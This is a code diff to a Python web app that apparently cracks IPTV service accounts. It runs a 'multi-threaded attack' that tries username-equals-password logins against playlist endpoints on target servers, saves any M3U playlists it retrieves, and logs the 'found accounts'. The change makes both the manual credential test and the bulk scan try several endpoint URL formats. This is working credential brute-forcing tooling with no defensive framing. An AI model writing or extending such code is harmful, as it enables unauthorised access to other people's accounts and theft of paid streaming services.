@@ -166,43 +166,41 @@ def test_credentials():
         server = "http://" + server
 
     headers = {'User-Agent': 'Mozilla/5.0'}
-    target_endpoint = server + crawler.basicString % (username, password)
-    log_event(f"Testing manual login on {server} (User: {username}, Pass: {password})...", to_console=True)
+    log_event(f"Testing manual login on {server} (User: {username}, Pass: {password}) across format variants...", to_console=True)
 
     import requests
-    try:
-        res = requests.get(target_endpoint, headers=headers, timeout=6)
-        if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
-            domain = server.replace("http://", "").replace("https://", "").strip("/")
-            new_path = os.path.join(crawler.outputDir, domain)
-            crawler.create_file(username, new_path, res.text)
-            
-            m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
-            playlist_url = f"{server}/get.php?username={username}&password={password}&type=m3u&output=mpegts"
-            
-            account_data = {
-                "server": server,
-                "username": username,
-                "password": password,
-                "file_path": m3u_file_path,
-                "playlist_url": playlist_url
-            }
-            
-            # Prevent duplicate entries in found list
-            if not any(acc["server"] == server and acc["username"] == username and acc["password"] == password for acc in found_accounts_list):
-                found_accounts_list.append(account_data)
+    for template in crawler.endpointTemplates:
+        target_endpoint = server + template % (username, password)
+        try:
+            res = requests.get(target_endpoint, headers=headers, timeout=6)
+            if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
+                domain = server.replace("http://", "").replace("https://", "").strip("/")
+                new_path = os.path.join(crawler.outputDir, domain)
+                crawler.create_file(username, new_path, res.text)
+                
+                m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
+                playlist_url = target_endpoint
+                
+                account_data = {
+                    "server": server,
+                    "username": username,
+                    "password": password,
+                    "file_path": m3u_file_path,
+                    "playlist_url": playlist_url
+                }
+                
+                if not any(acc["server"] == server and acc["username"] == username and acc["password"] == password for acc in found_accounts_list):
+                    found_accounts_list.append(account_data)
 
-            msg_found = f"SUCCESS! Manual login verified -> User: '{username}' | Pass: '{password}' | Server: '{server}'"
-            log_event(msg_found, to_console=True)
-            return jsonify({"success": True, "message": msg_found, "account": account_data})
-        else:
-            msg_fail = f"FAILED: Invalid credentials or non-M3U response from {server} (HTTP {res.status_code})"
-            log_event(msg_fail, to_console=True)
-            return jsonify({"success": False, "message": msg_fail})
-    except Exception as e:
-        msg_err = f"ERROR connecting to {server}: {e}"
-        log_event(msg_err, to_console=True)
-        return jsonify({"success": False, "message": msg_err}), 500
+                msg_found = f"SUCCESS! Manual login verified -> User: '{username}' | Pass: '{password}' | Server: '{server}' | Format: '{template}'"
+                log_event(msg_found, to_console=True)
+                return jsonify({"success": True, "message": msg_found, "account": account_data})
+        except Exception as e:
+            pass
+
+    msg_fail = f"FAILED: Invalid credentials or non-M3U response from {server} across all tested endpoint formats."
+    log_event(msg_fail, to_console=True)
+    return jsonify({"success": False, "message": msg_fail})
 
 @app.route("/api/scan", methods=["POST"])
 def start_scan():
@@ -219,14 +217,17 @@ def start_scan():
     def check_username(server, username, headers):
         if scan_state["cancel_requested"]:
             return None
-        target_endpoint = server + crawler.basicString % (username, username)
         import requests
-        try:
-            res = requests.get(target_endpoint, headers=headers, timeout=4)
-            if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
-                return (username, res.text)
-        except Exception:
-            pass
+        for template in crawler.endpointTemplates:
+            if scan_state["cancel_requested"]:
+                break
+            target_endpoint = server + template % (username, username)
+            try:
+                res = requests.get(target_endpoint, headers=headers, timeout=4)
+                if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
+                    return (username, res.text, target_endpoint)
+            except Exception:
+                pass
         return None
 
     def run_scan():
@@ -262,7 +263,7 @@ def start_scan():
                 break
 
             scan_state["current_url"] = server
-            msg_start = f"Starting multi-threaded attack on target: {server} [{threads_count} threads]"
+            msg_start = f"Starting multi-threaded attack on target: {server} [{threads_count} threads, 4 format variants]"
             scan_state["status_message"] = f"Attacking {server} ({threads_count} threads)..."
             log_event(msg_start, to_console=True)
 
@@ -319,7 +320,7 @@ def start_scan():
                             try:
                                 result = future.result()
                                 if result:
-                                    found_uname, fetched_text = result
+                                    found_uname, fetched_text, used_endpoint = result
                                     domain = server.replace("http://", "").replace("https://", "").strip("/")
                                     new_path = os.path.join(crawler.outputDir, domain)
                                     crawler.create_file(found_uname, new_path, fetched_text)
@@ -327,14 +328,13 @@ def start_scan():
                                     scan_state["found_accounts"] += 1
                                     
                                     m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
-                                    playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
                                     
                                     account_data = {
                                         "server": server,
                                         "username": found_uname,
                                         "password": found_uname,
                                         "file_path": m3u_file_path,
-                                        "playlist_url": playlist_url
+                                        "playlist_url": used_endpoint
                                     }
                                     found_accounts_list.append(account_data)
 
@@ -382,7 +382,7 @@ def start_scan():
                         try:
                             result = future.result()
                             if result:
-                                found_uname, fetched_text = result
+                                found_uname, fetched_text, used_endpoint = result
                                 domain = server.replace("http://", "").replace("https://", "").strip("/")
                                 new_path = os.path.join(crawler.outputDir, domain)
                                 crawler.create_file(found_uname, new_path, fetched_text)
@@ -390,14 +390,13 @@ def start_scan():
                                 scan_state["found_accounts"] += 1
                                 
                                 m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
-                                playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
                                 
                                 account_data = {
                                     "server": server,
                                     "username": found_uname,
                                     "password": found_uname,
                                     "file_path": m3u_file_path,
-                                    "playlist_url": playlist_url
+                                    "playlist_url": used_endpoint
                                 }
                                 found_accounts_list.append(account_data)
 
